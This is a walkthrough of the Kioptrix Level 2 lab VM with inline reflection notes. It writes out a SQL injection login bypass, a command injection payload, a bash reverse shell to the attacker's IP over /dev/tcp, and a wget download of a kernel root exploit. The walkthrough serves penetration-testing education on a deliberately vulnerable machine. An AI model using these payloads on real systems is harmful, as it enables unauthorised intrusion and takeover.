# Kioptrix 2

These are a series of challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). These games are to learn the basic tools and techniques in vulnerability assessment and exploitation.

## Action plan:

1. **Intelligence Gathering:**
    
    -   Use `netdiscover` to find the target VM's IP address on the network.
    -   Employ `nmap` to scan the target, identifying open ports, running services, and operating system details.
2. **Vulnerability Identification:**
    
    -   Analyze `nmap` results to pinpoint potential vulnerabilities, such as open ports (SSH, HTTP, HTTPS, MySQL, IPP) and running services (Apache, CUPS).
    -   Research known vulnerabilities associated with identified services (e.g., CUPS v1.1).
3. **Exploitation:**
    
    -   Discover a SQL injection vulnerability on the website's login page.
    -   Utilize SQL injection to bypass authentication and gain access to a ping command prompt.
    -   Identify and exploit a command injection vulnerability in the ping prompt to execute arbitrary commands.
4. **Reverse Shell:**
    
    -   Set up a Netcat listener on the attacker's machine.
    -   Use the command injection vulnerability to initiate a reverse shell connection from the target VM to the attacker's machine.
5. **Privilege Escalation:**
    
    -   Gather information about the target system's operating system and kernel version.
    -   Find a suitable privilege escalation exploit (ip\_append\_data\_() Ring0) based on the system information.
    -   Transfer the exploit to the target VM, compile it, and execute it to gain root access.
    

# Challenge Analysis: Kioptrix: Level 2

## 1. Intelligence Gathering

-   **Find Target IP:** Used `netdiscover` to scan the network (192.168.8.0/16) and identify the target VM's IP address as 192.168.1.5.
    
    <reflection>
    
    -   This is a standard initial step in penetration testing.
    -   `netdiscover` is an appropriate tool for this purpose.
    
    </reflection>
    
-   **Port and Service Scanning:** Employed `nmap` with options `-sS -A -n` to perform a stealth SYN scan, aggressive service detection, and no DNS resolution on the target IP (192.168.1.5).
    
    <reflection>
    
    -   `nmap` is a powerful tool for port and service scanning.
    
    </reflection>
    

## 2. Vulnerability Identification

-   **Analyze `nmap` Results:** Identified open ports (22/SSH, 80/HTTP, 443/HTTPS, 3306/MySQL, 631/IPP) and running services (OpenSSH 3.9p1, Apache 2.0.52, CUPS 1.1).
    
    <reflection>
    
    -   The identified ports and services are potential entry points for exploitation.
    
    </reflection>
    
-   **Research Vulnerabilities:** Investigated known vulnerabilities for the identified services, particularly focusing on CUPS v1.1 due to its history of exploits.
    
    <reflection>
    
    -   This is a crucial step in vulnerability assessment.
    -   Focusing on services with known vulnerabilities is a good strategy.
    
    </reflection>
    

## 3. Exploitation

-   **SQL Injection:** Discovered a SQL injection vulnerability on the website's login page. Injected `1' or '1'='1` into both username and password fields to bypass authentication.
    
    <reflection>
    
    -   SQL injection is a common web application vulnerability.
    -   The injected payload is a classic example of a SQL injection attack.
    
    </reflection>
    
-   **Command Injection:** Identified a command injection vulnerability in the ping command prompt. Used `127.0.0.1; id` to execute the `id` command after a ping command, confirming the vulnerability.
    
    <reflection>
    
    -   Command injection is another common web application vulnerability.
    -   The payload effectively demonstrates the ability to execute arbitrary commands.
    
    </reflection>
    

## 4. Reverse Shell

-   **Netcat Listener:** Set up a Netcat listener on the attacker's machine (192.168.1.3) using `nc -nlvp 443` to listen on port 443.
    
    <reflection>
    
    -   Netcat is a versatile tool for network connections.
    -   Listening on port 443 is a good choice as it's often open.
    
    </reflection>
    
-   **Reverse Shell Payload:** Used the command injection vulnerability to execute `127.0.0.1; bash -i >& /dev/tcp/192.168.1.3/443 0>&1`, initiating a reverse shell connection to the attacker's machine.
    
    <reflection>
    
    -   The payload effectively establishes a reverse shell using bash.
    
    </reflection>
    

## 5. Privilege Escalation

-   **System Information Gathering:** Used `cat /etc/*-release`, `cat /proc/version`, and `rpm -q kernel` to gather information about the target system's OS (CentOS 4.5) and kernel version (2.6.9-55.EL).
    
    <reflection>
    
    -   Gathering system information is crucial for finding suitable exploits.
    
    </reflection>
    
-   **Exploit Research:** Found a privilege escalation exploit called "ip\_append\_data\_() Ring0" that was suitable for the target system's kernel version.
    
    <reflection>
    
    -   Finding a relevant exploit is a key step in privilege escalation.
    
    </reflection>
    
-   **Exploit Transfer and Execution:**
    
    -   Copied the exploit code to a file (priv.c) on the attacker's machine.
    -   Compiled the exploit using `gcc -o priv priv.c`.
    -   Moved the compiled exploit to `/var/www/html` and started an Apache server on the attacker's machine.
    -   Used `wget http://192.168.1.3/priv` on the target machine to download the exploit.
    -   Changed the exploit's permissions using `chmod 755 priv`.
    -   Executed the exploit using `./priv`.
    
    <reflection>
    
    -   The steps for transferring and executing the exploit are well-defined.
    -   Using a web server to transfer the exploit is a common technique.
    
    </reflection>
    
-   **Root Access Confirmation:** Used `id` and `whoami` to confirm that the exploit successfully granted root access (uid=0(root), gid=0(root)).
    
    <reflection>
    
    -   These commands are standard for verifying user privileges.
    -   The output confirms that root access has been obtained.
    
    </reflection>
tell me about this page